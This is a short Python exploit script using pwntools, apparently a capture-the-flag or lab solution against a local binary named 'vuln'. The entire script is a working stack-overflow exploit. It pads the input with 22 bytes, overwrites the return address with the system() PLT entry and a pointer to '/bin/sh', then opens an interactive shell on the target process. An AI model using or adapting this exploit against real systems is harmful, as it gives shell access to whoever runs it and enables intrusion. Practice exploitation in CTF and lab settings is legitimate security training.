from pwn import *

context.binary = exe = ELF("../vuln")

context.log_level = "debug"

sys_plt = exe.plt.system

bin_ad = next(exe.search(b'/bin/sh\x00'))

payload = flat(
    'A' * 22,
    sys_plt,
    exe.symbols["some_function"],
    bin_ad
)

args = ['../vuln']

io = process(args)

io.recvuntil(b'Send something')

io.sendline(payload)

io.clean()

io.interactive()